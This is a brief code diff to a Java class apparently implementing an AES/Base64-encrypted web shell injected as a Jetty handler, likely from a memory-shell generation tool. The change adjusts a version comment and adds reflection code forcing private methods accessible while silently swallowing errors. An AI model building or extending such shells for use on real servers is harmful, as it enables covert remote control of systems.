@@ -4,7 +4,7 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
 
-//jetty7-12 test
+//jetty7-11 test
 public class AesBase64JettyHandleShell extends ClassLoader implements InvocationHandler {
     private static boolean initialized = false;
     private static final Object lock = new Object();
@@ -239,6 +239,15 @@ public class AesBase64JettyHandleShell extends ClassLoader implements Invocation
                 cs = cs.getSuperclass();
             }
         }
+
+        if (method!=null){
+            try {
+                method.setAccessible(true);
+            }catch (Throwable e){
+
+            }
+        }
+
         return method;
     }
 
